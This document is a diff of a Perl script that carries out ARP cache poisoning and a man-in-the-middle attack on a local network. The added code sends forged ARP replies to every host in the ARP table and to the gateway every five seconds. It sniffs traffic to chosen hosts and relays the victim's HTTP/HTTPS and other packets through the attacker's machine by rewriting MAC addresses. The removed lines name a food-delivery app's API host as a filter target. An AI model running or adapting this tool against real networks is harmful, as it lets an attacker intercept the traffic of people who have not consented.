@@ -4,24 +4,36 @@ use NetPacket::Ethernet qw(:strip);
 use NetPacket::IP qw(:strip);
 use NetPacket::TCP qw(:strip);
 use threads;
+use v5.26;
 
-
-chomp (my $ip = `ifconfig en0 | grep inet\\ | awk '{print \$2}'`);
-chomp (my $sub = `ifconfig en0 |grep inet\\ | awk '{print \$4}'`);
 my @route = get_route();
+my $arp_t = arp_table();
+my $dev = select_dev();
+chomp ($arp_t->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`);
+chomp($arp_t->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`);
 
 my $pcap;
 my $err;
-my $dev = select_dev();
-my $fil = 'host test.gilgil.net or omg-mobile-api.baemin.com';
-my @listing = snif_packet($dev);
-my %map = make_hash(@listing);
-#my @route = get_route();
-$map->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`;
-$map->{my_mac} =~ s/\n//g;
-$map->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`;
-$map->{my_ip} =~ s/\n| //g;
+$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
 
+threads->create(sub {
+		while(1){
+			foreach(1 .. $arp_t->{cnt}){
+				send_arp($arp_t->{$_}->{mac},$arp_t->{my_mac},$arp_t->{$_}->{ip},$route[0]);
+				send_arp($route[1],$arp_t->{my_mac},$route[0],$arp_t->{$_}->{ip});
+		}
+		sleep 5;
+		}
+});
+
+my @listing = snif_packet($dev);
+my $map = make_hash(@listing);
+#my %map = make_hash(@listing);
+
+$map->{my_mac} = $arp_t->{my_mac};
+$map->{my_ip} = $arp_t->{my_ip};
+#chomp ($map->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`);
+#chomp($map->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`);
 
 threads->create(sub {
 		while(1){
@@ -34,8 +46,39 @@ threads->create(sub {
 spoofing_packet($dev);
 
 pcap_close($pcap);
-threads->detach();
 
+sub arp_table{
+	my	$a = `arp -a`;
+	my	$table = {};
+	my	$cnt = 1;
+	my	$dev = "en0";
+	foreach (split "\n",$a){
+		if (/((\d{1,3}+\.?){4})(\) at )(.+)( on )($dev)/){
+			unless($4 =~ /incomplete/){
+				$table->{$cnt}->{ip} = $1;
+				$table->{$cnt}->{mac} = $4;
+				$cnt++;
+			}
+		}
+	}
+
+	foreach (1 .. $cnt-1){
+		if(length($table->{$_}->{mac}) < 17){
+			my $tmp;
+			my $cnt = 6;
+			foreach(split ":",$table->{$_}->{mac}){
+				if(length($_) == 1){ $tmp .= "0$_"; }
+				else{ $tmp .= $_; }
+				$cnt --;
+				$tmp .= ":" if($cnt);
+			}
+			$table->{$_}->{mac} = $tmp;
+		}
+	}
+	return $table;
+}
+
+=eod
 sub arp_spoofing{
 	my $cnt = 1;
 	while($cnt){
@@ -44,7 +87,7 @@ sub arp_spoofing{
 		$cnt --;
 	}
 }
-
+=cut
 sub send_arp{ #dest_mac , $src_mac , $dest_ip, $src_ip 
 	my @dest_mac = split (/:/,$_[0]);
 	my @src_mac = split (/:/, $_[1]);
@@ -76,11 +119,8 @@ sub make_hex{
 sub spoofing_packet{
 	my $filter;
 	my $dev = shift;
-#	my $filter_str = "dst host not $map->{my_ip} and ether dst $map->{mymac} or dst port 80 or dst port 443 or src port 80 or src port 443";
 	
 	my $find_packet = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
-#	pcap_compile( $find_packet, \$filter, $filter_str, 1, 0 );
-#	pcap_setfilter( $find_packet, $filter );
 
 	while(1){
 		my ($packet, %header);
@@ -89,40 +129,25 @@ sub spoofing_packet{
 		my $eth_obj = NetPacket::Ethernet->decode($packet);
 		my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
 
-#		if(split_mac($eth_obj->{dest_mac}) eq $map->{my_mac} && $ip_obj->{dest_ip} ne $map->{my_ip}){
 
 			if ($tcp_obj->{dest_port} == 80 || $tcp_obj->{dest_port} == 443){ #redirect packet
-				$re_packet = change_dest_mac($packet,$route[1]);
+				my $re_packet = change_dest_mac($packet,$route[1]);
 				pcap_sendpacket($find_packet,$re_packet);
-#				print "redirect callback server\n";
-#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
-#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
 			}
 			elsif ($tcp_obj->{src_port} == 80 || $tcp_obj->{src_port} == 443){ #redirect packet
-				$re_packet = change_dest_mac($packet,$map->{cli_mac});
+				my $re_packet = change_dest_mac($packet,$map->{cli_mac});
 				pcap_sendpacket($find_packet,$re_packet);
-
-#				print "redirect callback clinet\n";
-#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
-#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
 			
 			}
 			elsif (split_mac($eth_obj->{dest_mac}) eq $map->{my_mac} && $ip_obj->{dest_ip} ne $map->{my_ip} && $ip_obj->{src_ip} eq $map->{cli_ip}){ #send route packet
-				$re_packet = change_dest_mac($packet,$route[1]);
+				my $re_packet = change_dest_mac($packet,$route[1]);
 				pcap_sendpacket($find_packet,$re_packet);
-
-#				print "me -> route \n";
-#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
-#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
 
 			}
 			elsif ($ip_obj->{dest_ip} ne $map->{my_ip} && split_mac($eth_obj->{dest_mac}) eq $map->{my_mac}){ #send client packet
-				$re_packet = change_dest_mac($packet,$map->{cli_mac});
+				my $re_packet = change_dest_mac($packet,$map->{cli_mac});
 				pcap_sendpacket($find_packet,$re_packet);
 
-#				print "me -> client\n";
-#				print "port : $tcp_obj->{src_port} >> dest port : $tcp_obj->{dest_port}\n";
-#				print "$ip_obj->{src_ip} >> $ip_obj->{dest_ip}\n";
 			}
 			else {print : "undefind pcaket \n";}
 	}
@@ -130,14 +155,18 @@ sub spoofing_packet{
 
 sub change_dest_mac{
 	my @tmp = split "",$_[0];
-	my @mac = split "",$_[1];
-	@hex = ($mac[0].$mac[1] ,$mac[3].$mac[4] ,$mac[6].$mac[7] ,$mac[9].$mac[10] ,$mac[12].$mac[13] ,$mac[15].$mac[16]);
+	my @mac = split ":",$_[1];
 	my $index = 0;
-	foreach(@hex){
+	foreach(@mac){
 		$tmp[$index] = chr(hex($_));
 		$index++;
 	}
-	my $ret = sprintf("@tmp");
+#my $ret = sprintf("@tmp");
+	my $ret;
+	foreach(@tmp){
+		$ret .= $_;
+	}
+#my $ret = sprintf("@tmp");
 	$ret =~ s/ //g;
 	return $ret
 }
@@ -146,11 +175,7 @@ sub snif_packet{
 	print "Start packet capture \n";
 	my @ret;
 	my $dev = shift;
-	my $filter;
-	my $filter_str = "host test.gilgil.net or omg-mobile-api.baemin.com";
 	$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
-	pcap_compile( $pcap, \$filter, $filter_str, 1, 0 );
-	pcap_setfilter( $pcap, $filter );
 
 	while(1){
 		my ($packet, %header);
@@ -158,7 +183,7 @@ sub snif_packet{
 		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
 		my $eth_obj = NetPacket::Ethernet->decode($packet);
 
-		if($packet){
+		if ($ip_obj->{dest_ip} eq "175.213.35.39"){
 			push @ret , $ip_obj->{src_ip};
 			push @ret , split_mac($eth_obj->{src_mac});
 			push @ret , $ip_obj->{dest_ip};
@@ -174,7 +199,7 @@ sub split_mac{
 	my $mac = shift;
 	my $ret;
 	if (length($mac) == 12){
-		@tmp = split "",$mac;
+		my @tmp = split "",$mac;
 		my $cnt = 5;
 		my $flag = 1;
 		foreach(@tmp){
@@ -185,7 +210,7 @@ sub split_mac{
 	}
 	else {
 		$mac = "0".$mac;
-		@tmp = split "",$mac;
+		my @tmp = split "",$mac;
 		my $cnt = 5;
 		my $flag = 1;
 		foreach(@tmp){
@@ -211,7 +236,7 @@ sub select_dev{
 
 sub make_hash{
 	my @listing = @_;
-	my %map;
+	my $map = {};
 	print "1. $listing[0] / $listing[1]\n";
 	print "2. $listing[2] / $listing[3]\n";
 	print "select server number : ";
@@ -228,8 +253,13 @@ sub make_hash{
 		$map->{cli_ip} = $listing[0];
 		$map->{cli_mac} = $listing[1];
 	}
+
 	else {print "Err number _ \n";}
-	return %map;
+	print "Target ip : $map->{cli_ip}\n";
+	print "Target mac : $map->{cli_mac}\n";
+	print "Route ip : $route[0]\n";
+	print "Route mac : $route[1]\n";
+	return $map;
 }
 
 sub get_route{
